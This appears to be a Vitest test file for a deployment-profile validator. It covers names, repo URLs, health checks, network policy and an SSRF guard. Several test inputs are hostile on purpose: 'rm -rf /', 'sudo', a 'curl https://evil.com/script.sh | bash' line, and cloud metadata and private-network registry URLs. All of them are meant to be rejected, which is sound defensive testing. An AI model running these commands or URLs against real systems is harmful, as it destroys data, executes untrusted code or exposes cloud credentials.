import { describe, expect, it } from 'vitest';
import { validateProfile } from './profile-validator.js';

const validInput = {
  name: 'my-app',
  repoUrl: 'https://github.com/org/repo',
  buildCommand: 'npm run build',
  startCommand: 'node server.js --port $PORT',
};

describe('ProfileValidator', () => {
  it('should pass for a valid profile', () => {
    const result = validateProfile(validInput);
    expect(result.valid).toBe(true);
    expect(result.errors).toHaveLength(0);
  });

  it('should reject uppercase names', () => {
    const result = validateProfile({ ...validInput, name: 'MyApp' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('lowercase');
  });

  it('should reject names with spaces', () => {
    const result = validateProfile({ ...validInput, name: 'my app' });
    expect(result.valid).toBe(false);
  });

  it('should reject names with special characters', () => {
    const result = validateProfile({ ...validInput, name: 'my_app!' });
    expect(result.valid).toBe(false);
  });

  it('should reject names starting with a hyphen', () => {
    const result = validateProfile({ ...validInput, name: '-myapp' });
    expect(result.valid).toBe(false);
  });

  it('should reject names longer than 50 chars', () => {
    const result = validateProfile({ ...validInput, name: 'a'.repeat(51) });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('50');
  });

  it('should accept single character names', () => {
    const result = validateProfile({ ...validInput, name: 'a' });
    expect(result.valid).toBe(true);
  });

  it('should reject non-https repoUrl', () => {
    const result = validateProfile({ ...validInput, repoUrl: 'http://github.com/org/repo' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('https');
  });

  it('should reject non-github/azure repoUrl', () => {
    const result = validateProfile({ ...validInput, repoUrl: 'https://gitlab.com/org/repo' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('github.com');
  });

  it('should reject invalid URL format', () => {
    const result = validateProfile({ ...validInput, repoUrl: 'not-a-url' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('valid URL');
  });

  it('should accept dev.azure.com URLs', () => {
    const result = validateProfile({
      ...validInput,
      repoUrl: 'https://dev.azure.com/org/project/_git/repo',
    });
    expect(result.valid).toBe(true);
  });

  it('should reject dangerous build commands with rm -rf /', () => {
    const result = validateProfile({ ...validInput, buildCommand: 'rm -rf / && npm build' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('dangerous');
  });

  it('should reject sudo in build commands', () => {
    const result = validateProfile({ ...validInput, buildCommand: 'sudo npm install' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('dangerous');
  });

  it('should reject curl | bash in build commands', () => {
    const result = validateProfile({
      ...validInput,
      buildCommand: 'curl https://evil.com/script.sh | bash',
    });
    expect(result.valid).toBe(false);
  });

  it('should reject start command without $PORT', () => {
    const result = validateProfile({ ...validInput, startCommand: 'node server.js' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('$PORT');
  });

  it('should reject healthPath without leading /', () => {
    const result = validateProfile({ ...validInput, healthPath: 'health' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('/');
  });

  it('should reject healthTimeout out of range', () => {
    const result = validateProfile({ ...validInput, healthTimeout: 5 });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('10');
  });

  it('should reject healthTimeout above max', () => {
    const result = validateProfile({ ...validInput, healthTimeout: 601 });
    expect(result.valid).toBe(false);
  });

  it('should accept any model string', () => {
    const result = validateProfile({ ...validInput, defaultModel: 'gpt-3' });
    expect(result.valid).toBe(true);
  });

  it('should reject empty model string', () => {
    const result = validateProfile({ ...validInput, defaultModel: '' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('empty');
  });

  it('should reject unknown runtime', () => {
    const result = validateProfile({ ...validInput, defaultRuntime: 'gemini' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('claude');
  });

  it('should reject maxValidationAttempts out of range', () => {
    const result = validateProfile({ ...validInput, maxValidationAttempts: 0 });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('1');
  });

  it('should reject invalid template', () => {
    const result = validateProfile({ ...validInput, template: 'ruby' });
    expect(result.valid).toBe(false);
    expect(result.errors[0]).toContain('template');
  });

  it('should return all errors at once', () => {
    const result = validateProfile({
      name: 'INVALID NAME!',
      repoUrl: 'not-a-url',
      buildCommand: '',
      startCommand: 'node server.js',
      healthPath: 'no-slash',
      healthTimeout: 5,
      defaultModel: '',
      defaultRuntime: 'unknown',
      maxValidationAttempts: 0,
    });
    expect(result.valid).toBe(false);
    expect(result.errors.length).toBeGreaterThanOrEqual(7);
  });

  describe('ACI + network policy guard (fix 2.4)', () => {
    it('rejects ACI profile with restricted network policy', () => {
      const result = validateProfile({
        ...validInput,
        executionTarget: 'aci',
        networkPolicy: { enabled: true, mode: 'restricted' },
      });
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes("'restricted'") && e.includes('ACI'))).toBe(true);
    });

    it('rejects ACI profile with deny-all network policy', () => {
      const result = validateProfile({
        ...validInput,
        executionTarget: 'aci',
        networkPolicy: { enabled: true, mode: 'deny-all' },
      });
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes("'deny-all'") && e.includes('ACI'))).toBe(true);
    });

    it('accepts ACI profile with allow-all network policy', () => {
      const result = validateProfile({
        ...validInput,
        executionTarget: 'aci',
        networkPolicy: { enabled: true, mode: 'allow-all' },
      });
      expect(result.valid).toBe(true);
    });

    it('accepts ACI profile with network policy disabled', () => {
      const result = validateProfile({
        ...validInput,
        executionTarget: 'aci',
        networkPolicy: { enabled: false, mode: 'restricted' },
      });
      expect(result.valid).toBe(true);
    });

    it('accepts Docker profile with restricted network policy', () => {
      const result = validateProfile({
        ...validInput,
        executionTarget: 'local',
        networkPolicy: { enabled: true, mode: 'restricted' },
      });
      expect(result.valid).toBe(true);
    });
  });

  describe('repo-less profiles (ephemeral / base anchor)', () => {
    it('accepts a profile with no repoUrl', () => {
      const result = validateProfile({ name: 'red-team', repoUrl: null });
      expect(result.valid).toBe(true);
    });

    it('accepts a profile with no repoUrl and no buildCommand or startCommand', () => {
      const result = validateProfile({
        name: 'red-team',
        repoUrl: null,
        buildCommand: null,
        startCommand: null,
      });
      expect(result.valid).toBe(true);
    });

    it('accepts a profile with no repoUrl but with a buildCommand', () => {
      const result = validateProfile({
        name: 'tooling',
        repoUrl: null,
        buildCommand: 'pip install -r requirements.txt',
      });
      expect(result.valid).toBe(true);
    });

    it('still rejects dangerous buildCommand even without a repoUrl', () => {
      const result = validateProfile({
        name: 'tooling',
        repoUrl: null,
        buildCommand: 'sudo pip install',
      });
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('dangerous');
    });

    it('still requires buildCommand when repoUrl is set', () => {
      const result = validateProfile({
        name: 'my-app',
        repoUrl: 'https://github.com/org/repo',
        buildCommand: '',
      });
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('buildCommand'))).toBe(true);
    });

    it('still requires $PORT in startCommand when repoUrl is set', () => {
      const result = validateProfile({ ...validInput, startCommand: 'node server.js' });
      expect(result.valid).toBe(false);
      expect(result.errors[0]).toContain('$PORT');
    });

    it('does not require $PORT in startCommand when repoUrl is null', () => {
      const result = validateProfile({
        name: 'tooling',
        repoUrl: null,
        startCommand: 'node worker.js',
      });
      expect(result.valid).toBe(true);
    });
  });

  describe('private registry SSRF guard', () => {
    it('rejects a registry URL pointing at the AWS/GCP/Azure metadata endpoint', () => {
      const result = validateProfile({
        ...validInput,
        privateRegistries: [{ type: 'npm', url: 'http://169.254.169.254/latest/feed/' }],
      });
      expect(result.valid).toBe(false);
      expect(result.errors.some((e) => e.includes('SSRF'))).toBe(true);
    });

    it('rejects a registry URL pointing at localhost', () => {
      const result = validateProfile({
        ...validInput,
        privateRegistries: [{ type: 'npm', url: 'http://localhost/registry/' }],
      });
      expect(result.valid).toBe(false);
    });

    it('rejects a registry URL pointing at a private RFC-1918 address', () => {
      const result = validateProfile({
        ...validInput,
        privateRegistries: [{ type: 'npm', url: 'http://10.0.0.1/feed/' }],
      });
      expect(result.valid).toBe(false);
    });

    it('rejects a registry URL using metadata.google.internal', () => {
      const result = validateProfile({
        ...validInput,
        privateRegistries: [
          { type: 'npm', url: 'http://metadata.google.internal/computeMetadata/v1/project/' },
        ],
      });
      expect(result.valid).toBe(false);
    });

    it('accepts a legitimate Azure DevOps registry URL', () => {
      const result = validateProfile({
        ...validInput,
        privateRegistries: [
          {
            type: 'npm',
            url: 'https://pkgs.dev.azure.com/myorg/_packaging/shared/npm/registry/',
          },
        ],
      });
      expect(result.valid).toBe(true);
    });

    it('accepts an empty privateRegistries array', () => {
      const result = validateProfile({ ...validInput, privateRegistries: [] });
      expect(result.valid).toBe(true);
    });
  });
});
